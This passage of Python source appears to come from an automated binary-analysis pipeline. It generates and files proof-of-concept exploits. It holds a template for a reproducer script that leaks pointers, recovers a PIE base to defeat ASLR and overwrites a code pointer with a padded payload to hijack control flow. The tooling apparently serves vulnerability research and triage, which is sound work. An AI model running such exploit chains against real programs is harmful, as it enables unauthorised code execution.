        "        o=s[4]+i*s[9]; info=d[o+4]; val,=struct.unpack_from(e+'Q',d,o+8)\n"
        "        t=info&0xf\n"
        "        if t in (1,2) and val: a[val&0xfff].append(val)\n"
        "    if a: break\n"
        "  return a\n"
        "def recover(vals, anchors):\n"
        "  sup=collections.defaultdict(set)\n"
        "  for v in vals:\n"
        "    if 0x1000<=v<=0x7fffffffffff:\n"
        "      for va in anchors.get(v&0xfff,()):\n"
        "        b=v-va\n"
        "        if b>0 and b&0xfff==0: sup[b].add(v)\n"
        "  best=max(sup, key=lambda b:len(sup[b]), default=None)\n"
        "  return best if best is not None and len(sup[best])>=2 else None\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "drain(); send(LEAK+'\\n'); out=drain()\n"
        "vals=[int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+',out)]\n"
        "base=recover(vals, syms(EXE))\n"
        "assert base, 'no base recovered from leak'\n"
        "send(WRITER+'\\n'); drain()\n"
        "send(b'A'*OFF+struct.pack('<Q',base+WIN_VADDR)); drain()\n"
        f"{trig_send}"
        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
    ).encode()


def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig):
    """File a confirmed PIE leak-chain as an L3 verified PoC (bundle = target + a runnable
    leak-then-chain reproducer)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig)
    input_sha = ctx.put_artifact("pie-chain-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow (PIE, leak-relocated)", "target": win_name,
            "win_vaddr": hex(win_vaddr), "leak_option": leak_opt, "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True, "note": "PIE leak-relocated"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via option "
           f"{leak_opt}, recovered the image base, then option {writer} overwrote an adjacent code "
           f"pointer at +{off} with base+{win_vaddr:#x} ({win_name}); {trg} ran it. Shown in "
           f"ONE process (a real ASLR defeat) and confirmed by the win's output under a passing "
           f"negative control (a corrupted address does not win).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 PIE leak-chain",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:pie:{target.id}", "site_detail": win_name,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Control-flow hijack (PIE, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "leak": leak_opt, "writer": writer, "offset": off, "trigger": trig,
             "pie": True, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}


def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
    """L2 guidance: the concrete technique + target to finish the chain by hand."""
    from ...db.dao import FindingDAO
    tech = recipe.get("technique", "heap-technique")
    tgt = f" -> {win[0]} (0x{win[1]:x})" if win else ""
    detail = (f"{vclass} primitive can be chained via {tech}{tgt}, but a live hijack was not "
              f"demonstrated here ({why}). {recipe.get('note', '')}").strip()
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": lead.cwe, "title": f"Exploitation recipe: {vclass} -> {tech}",
        "severity": "high", "detector": "chain_primitive", "state": "corroborated",
        "confidence": 0.5, "dedup_key": f"chain-recipe:{vclass}:{target.id}",
        "site_detail": tech,
        "evidence": [{"channel": "chain", "detail": detail}]})


def register() -> None:
    register_stage(CHAIN_STAGE, chain_primitive_stage, resource_class="cpu",
                   tool="ptrace", tool_version=TOOL_VERSION)


def enqueue_chain(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, CHAIN_STAGE, target_id=target.id,
                         params=params or {}, force=force)
